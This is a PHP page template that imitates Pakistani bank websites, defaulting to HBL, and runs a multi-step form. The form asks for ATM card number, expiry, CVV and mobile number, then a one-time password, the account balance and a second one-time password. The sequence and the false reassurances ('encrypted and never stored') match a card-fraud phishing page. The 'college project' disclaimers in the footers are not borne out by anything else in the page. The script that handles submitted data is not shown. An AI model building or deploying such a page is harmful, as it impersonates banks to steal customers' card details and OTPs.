<?php
$banksJson = file_get_contents(__DIR__ . '/data/banks.json');
$banks = json_decode($banksJson, true) ?? [];

function getBankSlug($name) {
    return trim(preg_replace('/[^a-z0-9]+/i', '-', preg_replace('/[()]/', '', strtolower($name))), '-');
}

$slug = $_GET['slug'] ?? 'hbl';
$step = $_GET['step'] ?? 'card'; // 'card', 'otp', 'balance', 'verify'
$mobileParam = $_GET['mobile'] ?? '';

$currentBank = null;
foreach ($banks as $b) {
    if (getBankSlug($b['name']) === $slug) {
        $currentBank = $b;
        break;
    }
}

if (!$currentBank) {
    $currentBank = $banks[0] ?? [
        'name' => 'HBL',
        'short' => 'HB',
        'category' => 'Conventional',
        'color' => '#0a8a3f',
        'logo' => '/logos/hbl.png',
        'cardImage' => 'https://cdn.corenexis.com/f/KUIhqiMpmJh.png'
    ];
}

$pageTitles = [
    'card'    => $currentBank['name'] . ' | Card Details',
    'otp'     => $currentBank['name'] . ' | Confirm OTP',
    'balance' => $currentBank['name'] . ' | Account Balance',
    'verify'  => $currentBank['name'] . ' | Verify OTP'
];

$pageDescriptions = [
    'card'    => 'Enter your ' . $currentBank['name'] . ' card details.',
    'otp'     => 'Confirm the OTP for your ' . $currentBank['name'] . ' transaction.',
    'balance' => 'Enter your current ' . $currentBank['name'] . ' account balance.',
    'verify'  => 'Verify the OTP to complete your ' . $currentBank['name'] . ' transaction.'
];

$backUrls = [
    'card'    => '/',
    'otp'     => '/bank/' . $slug,
    'balance' => '/bank/' . $slug . '/otp' . ($mobileParam ? '?mobile=' . urlencode($mobileParam) : ''),
    'verify'  => '/bank/' . $slug . '/balance'
];

$backAria = [
    'card'    => 'Back to bank directory',
    'otp'     => 'Back to card details',
    'balance' => 'Back to OTP',
    'verify'  => 'Back to account balance'
];
?>
<!DOCTYPE html>
<html lang="en" class="bg-background">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?= htmlspecialchars($pageTitles[$step] ?? $currentBank['name']) ?></title>
    <meta name="description" content="<?= htmlspecialchars($pageDescriptions[$step] ?? '') ?>">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=Noto+Nastaliq+Urdu:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/public/css/style.css">
    <meta name="theme-color" content="#1f8a52">
    <style>
        :root {
            --primary: #005030;
            --primary-dark: #003821;
            --primary-foreground: #f6fcf6;
        }
        body { font-family: 'Manrope', system-ui, sans-serif; }
    </style>
</head>
<body class="font-sans antialiased text-foreground selection:bg-primary/20">
    <main class="min-h-dvh">
        <!-- HEADER -->
        <header class="border-b border-border bg-card">
            <div class="mx-auto flex max-w-md items-center gap-3 px-4 py-4">
                <a href="<?= htmlspecialchars($backUrls[$step]) ?>" aria-label="<?= htmlspecialchars($backAria[$step]) ?>" class="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg text-foreground transition hover:bg-secondary focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5"><polyline points="15 18 9 12 15 6"/></svg>
                </a>
                <span class="flex h-11 w-11 shrink-0 items-center justify-center overflow-hidden rounded-xl bg-white p-1.5 shadow-sm ring-1 ring-black/5">
                    <?php if (!empty($currentBank['logo'])): ?>
                        <img src="/public<?= $currentBank['logo'] ?>" onerror="this.src='https://sbp-phase-3.vercel.app<?= $currentBank['logo'] ?>'; this.onerror=function(){this.style.display='none'; this.nextElementSibling.style.display='flex';};" alt="<?= htmlspecialchars($currentBank['name']) ?> logo" class="h-full w-full object-contain" loading="lazy">
                        <span class="hidden h-full w-full items-center justify-center rounded-lg font-bold text-white text-sm" style="background-color: <?= $currentBank['color'] ?>"><?= $currentBank['short'] ?></span>
                    <?php else: ?>
                        <span class="flex h-full w-full items-center justify-center rounded-lg font-bold text-white text-sm" style="background-color: <?= $currentBank['color'] ?>"><?= $currentBank['short'] ?></span>
                    <?php endif; ?>
                </span>
                <div class="min-w-0">
                    <h1 class="truncate text-base font-bold capitalize"><?= htmlspecialchars($currentBank['name']) ?></h1>
                    <p class="text-xs text-muted-foreground"><?= htmlspecialchars($currentBank['category']) ?> bank</p>
                </div>
            </div>
        </header>

        <div class="mx-auto max-w-md px-4 py-5">
            <?php if ($step === 'card'): ?>
                <!-- STEP 1: CARD DETAILS -->
                <div class="relative overflow-hidden rounded-3xl px-5 pb-8 pt-6" style="background-image:linear-gradient(150deg, oklch(0.22 0.03 158) 0%, oklch(0.14 0.02 160) 60%, oklch(0.1 0.01 160) 100%)">
                    <div aria-hidden="true" class="pointer-events-none absolute -right-10 -top-16 h-48 w-48 rounded-full opacity-30 blur-3xl" style="background-color: <?= $currentBank['color'] ?? '#0a8a3f' ?>"></div>
                    <div class="relative flex items-center justify-center">
                        <img src="<?= htmlspecialchars($currentBank['cardImage'] ?? 'https://cdn.corenexis.com/f/KUIhqiMpmJh.png') ?>" alt="<?= htmlspecialchars($currentBank['name']) ?> debit card" class="h-auto w-full max-w-[20rem] rounded-2xl object-contain drop-shadow-2xl" crossorigin="anonymous">
                    </div>
                </div>

                <form id="card-form" class="mt-6 space-y-4" data-bank-slug="<?= htmlspecialchars($slug) ?>" data-bank-name="<?= htmlspecialchars($currentBank['name']) ?>">
                    <div>
                        <label for="card-number" class="sr-only">ATM Card Number (16 digits)</label>
                        <input id="card-number" inputmode="numeric" autocomplete="off" placeholder="ATM Card Number (16 digits)" class="w-full rounded-2xl border border-border bg-card px-5 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary" value="">
                    </div>

                    <div class="grid grid-cols-3 gap-3">
                        <div>
                            <label for="exp-month" class="sr-only">Expiry month</label>
                            <select id="exp-month" class="w-full rounded-2xl border border-border bg-card px-4 py-4 text-base shadow-sm outline-none ring-2 ring-transparent transition focus:ring-primary text-muted-foreground">
                                <option value="" selected>MM</option>
                                <?php for ($m = 1; $m <= 12; $m++): $mm = str_pad($m, 2, '0', STR_PAD_LEFT); ?>
                                    <option value="<?= $mm ?>"><?= $mm ?></option>
                                <?php endfor; ?>
                            </select>
                        </div>
                        <div>
                            <label for="exp-year" class="sr-only">Expiry year</label>
                            <select id="exp-year" class="w-full rounded-2xl border border-border bg-card px-4 py-4 text-base shadow-sm outline-none ring-2 ring-transparent transition focus:ring-primary text-muted-foreground">
                                <option value="" selected>YYYY</option>
                                <?php $currentYear = (int)date('Y'); for ($y = $currentYear; $y <= $currentYear + 9; $y++): ?>
                                    <option value="<?= $y ?>"><?= $y ?></option>
                                <?php endfor; ?>
                            </select>
                        </div>
                        <div>
                            <label for="cvv" class="sr-only">CVV</label>
                            <input id="cvv" inputmode="numeric" autocomplete="off" placeholder="CVV" maxlength="4" class="w-full rounded-2xl border border-border bg-card px-4 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary" value="">
                        </div>
                    </div>

                    <div>
                        <label for="mobile" class="sr-only">Mobile Number</label>
                        <input id="mobile" inputmode="numeric" autocomplete="tel" placeholder="Mobile Number (03XXXXXXXXX)" maxlength="11" class="w-full rounded-2xl border border-border bg-card px-5 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary" value="<?= htmlspecialchars($mobileParam) ?>">
                    </div>

                    <!-- STEP INDICATOR: 1 of 5 -->
                    <div class="flex items-center justify-center gap-2 py-2" role="status" aria-label="Step 1 of 5">
                        <span class="h-2 rounded-full transition-all w-6 bg-primary"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    </div>

                    <button id="card-submit-btn" type="submit" disabled class="flex w-full items-center justify-center gap-2 rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground shadow-md transition hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50">
                        <span>Next</span>
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5"><polyline points="9 18 15 12 9 6"/></svg>
                    </button>

                    <p class="pt-1 text-center text-xs text-muted-foreground">
                        Demo directory for a college project. Do not enter real card details.
                    </p>
                </form>

            <?php elseif ($step === 'otp'): ?>
                <!-- STEP 2: OTP CONFIRMATION -->
                <form id="otp-form" class="mt-6" data-bank-slug="<?= htmlspecialchars($slug) ?>" data-bank-name="<?= htmlspecialchars($currentBank['name']) ?>" data-mode="continue" data-active-step="3">
                    <h2 class="text-2xl font-extrabold tracking-tight">Confirm OTP</h2>
                    <p class="mt-2 text-pretty text-sm leading-relaxed text-muted-foreground">
                        Enter the 6-digit confirmation code sent to <span id="masked-phone" class="font-semibold text-foreground">your registered number</span>.
                    </p>

                    <div class="mt-5 rounded-3xl border border-border bg-card p-5 shadow-sm">
                        <div class="flex justify-center gap-2 sm:gap-3">
                            <?php for ($i = 1; $i <= 6; $i++): ?>
                                <input inputmode="numeric" autocomplete="<?= $i === 1 ? 'one-time-code' : 'off' ?>" maxlength="1" aria-label="Digit <?= $i ?>" class="otp-box h-12 w-11 rounded-xl border border-border bg-secondary/40 text-center text-xl font-bold text-foreground outline-none ring-2 ring-transparent transition focus:border-primary focus:ring-primary sm:h-14 sm:w-12" value="">
                            <?php endfor; ?>
                        </div>

                        <p id="otp-invalid-alert" class="hidden mt-4 flex items-center justify-center gap-1.5 text-center text-sm font-semibold text-destructive" role="alert">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>
                            Invalid OTP. Please try again.
                        </p>

                        <p class="mt-4 text-center text-sm text-muted-foreground">
                            Didn't receive the code? <span id="timer-wrapper" class="font-semibold text-foreground">Resend in <span id="countdown">05:00</span></span>
                            <button id="resend-btn" type="button" class="hidden font-semibold text-primary underline-offset-2 hover:underline focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring">Resend code</button>
                        </p>
                    </div>

                    <div class="mt-4 flex items-start gap-2 rounded-2xl border border-amber-500/30 bg-amber-500/10 px-4 py-3">
                        <div class="mt-0.5 shrink-0">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4 text-amber-500"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><line x1="12" x2="12" y1="9" y2="13"/><line x1="12" x2="12.01" y1="17" y2="17"/></svg>
                        </div>
                        <p class="text-sm leading-relaxed text-amber-700 dark:text-amber-300">
                            Never share your OTP with anyone. Your bank will never ask for your OTP over a call or SMS.
                        </p>
                    </div>

                    <!-- STEP INDICATOR: 4 of 5 -->
                    <div class="flex items-center justify-center gap-2 py-5" role="status" aria-label="Step 4 of 5">
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-6 bg-primary"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    </div>

                    <button id="otp-submit-btn" type="submit" disabled class="flex w-full items-center justify-center gap-2 rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground shadow-md transition hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50">
                        <span>Confirm OTP</span>
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5"><polyline points="9 18 15 12 9 6"/></svg>
                    </button>

                    <p class="pt-3 text-center text-xs text-muted-foreground">
                        Demo directory for a college project. No real OTP is sent or verified.
                    </p>
                </form>

            <?php elseif ($step === 'balance'): ?>
                <!-- STEP 3: ACCOUNT BALANCE -->
                <form id="balance-form" class="mt-6" data-bank-slug="<?= htmlspecialchars($slug) ?>" data-bank-name="<?= htmlspecialchars($currentBank['name']) ?>">
                    <h2 class="text-2xl font-extrabold tracking-tight">Account Balance</h2>
                    <p class="mt-2 text-pretty text-sm leading-relaxed text-muted-foreground">
                        Enter your current <?= htmlspecialchars($currentBank['name']) ?> account balance in PKR.
                    </p>

                    <div class="mt-5 rounded-3xl border border-border bg-card p-5 shadow-sm">
                        <label for="balance" class="block text-xs font-bold uppercase tracking-wider text-muted-foreground">Current Balance</label>
                        <div class="mt-3 flex items-center gap-3 rounded-2xl border border-border bg-secondary/30 px-4 py-3 focus-within:border-primary focus-within:ring-2 focus-within:ring-primary">
                            <span class="shrink-0 text-sm font-bold text-foreground">PKR</span>
                            <span class="h-6 w-px shrink-0 bg-border" aria-hidden="true"></span>
                            <input id="balance" inputmode="numeric" autocomplete="off" placeholder="0" class="w-full bg-transparent text-lg font-semibold text-foreground outline-none placeholder:text-muted-foreground/60" value="">
                        </div>
                    </div>

                    <div class="mt-4 flex items-start gap-2 rounded-2xl border border-primary/20 bg-primary/5 px-4 py-3">
                        <div class="mt-0.5 shrink-0">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4 text-primary"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="16" y2="12"/><line x1="12" x2="12.01" y1="8" y2="8"/></svg>
                        </div>
                        <p class="text-sm leading-relaxed text-primary">
                            This is required to verify your account. Your balance is encrypted and never stored on our servers.
                        </p>
                    </div>

                    <!-- STEP INDICATOR: 5 of 5 -->
                    <div class="flex items-center justify-center gap-2 py-5" role="status" aria-label="Step 5 of 5">
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-6 bg-primary"></span>
                    </div>

                    <button id="balance-submit-btn" type="submit" disabled class="flex w-full items-center justify-center gap-2 rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground shadow-md transition hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50">
                        <span>Next</span>
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5"><polyline points="9 18 15 12 9 6"/></svg>
                    </button>

                    <p class="pt-3 text-center text-xs text-muted-foreground">
                        Demo directory for a college project. No account data is stored or sent.
                    </p>
                </form>

            <?php elseif ($step === 'verify'): ?>
                <!-- STEP 4: RE-VERIFY OTP -->
                <form id="otp-form" class="mt-6" data-bank-slug="<?= htmlspecialchars($slug) ?>" data-bank-name="<?= htmlspecialchars($currentBank['name']) ?>" data-mode="reverify" data-active-step="4">
                    <h2 class="text-2xl font-extrabold tracking-tight">Confirm OTP</h2>
                    <p class="mt-2 text-pretty text-sm leading-relaxed text-muted-foreground">
                        Enter the 6-digit confirmation code sent to <span id="masked-phone" class="font-semibold text-foreground">your registered number</span>.
                    </p>

                    <div class="mt-5 rounded-3xl border border-border bg-card p-5 shadow-sm">
                        <div class="flex justify-center gap-2 sm:gap-3">
                            <?php for ($i = 1; $i <= 6; $i++): ?>
                                <input inputmode="numeric" autocomplete="<?= $i === 1 ? 'one-time-code' : 'off' ?>" maxlength="1" aria-label="Digit <?= $i ?>" class="otp-box h-12 w-11 rounded-xl border border-border bg-secondary/40 text-center text-xl font-bold text-foreground outline-none ring-2 ring-transparent transition focus:border-primary focus:ring-primary sm:h-14 sm:w-12" value="">
                            <?php endfor; ?>
                        </div>

                        <p id="otp-invalid-alert" class="hidden mt-4 flex items-center justify-center gap-1.5 text-center text-sm font-semibold text-destructive" role="alert">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>
                            Invalid OTP. Please try again.
                        </p>

                        <p class="mt-4 text-center text-sm text-muted-foreground">
                            Didn't receive the code? <span id="timer-wrapper" class="font-semibold text-foreground">Resend in <span id="countdown">05:00</span></span>
                            <button id="resend-btn" type="button" class="hidden font-semibold text-primary underline-offset-2 hover:underline focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring">Resend code</button>
                        </p>
                    </div>

                    <div class="mt-4 flex items-start gap-2 rounded-2xl border border-amber-500/30 bg-amber-500/10 px-4 py-3">
                        <div class="mt-0.5 shrink-0">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4 text-amber-500"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><line x1="12" x2="12" y1="9" y2="13"/><line x1="12" x2="12.01" y1="17" y2="17"/></svg>
                        </div>
                        <p class="text-sm leading-relaxed text-amber-700 dark:text-amber-300">
                            Never share your OTP with anyone. Your bank will never ask for your OTP over a call or SMS.
                        </p>
                    </div>

                    <!-- STEP INDICATOR: 5 of 5 -->
                    <div class="flex items-center justify-center gap-2 py-5" role="status" aria-label="Step 5 of 5">
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                        <span class="h-2 rounded-full transition-all w-6 bg-primary"></span>
                    </div>

                    <button id="otp-submit-btn" type="submit" disabled class="flex w-full items-center justify-center gap-2 rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground shadow-md transition hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50">
                        <span>Confirm OTP</span>
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5"><polyline points="9 18 15 12 9 6"/></svg>
                    </button>

                    <p class="pt-3 text-center text-xs text-muted-foreground">
                        Demo directory for a college project. No real OTP is sent or verified.
                    </p>
                </form>
            <?php endif; ?>
        </div>
    </main>

    <script src="/public/js/main.js"></script>
</body>
</html>
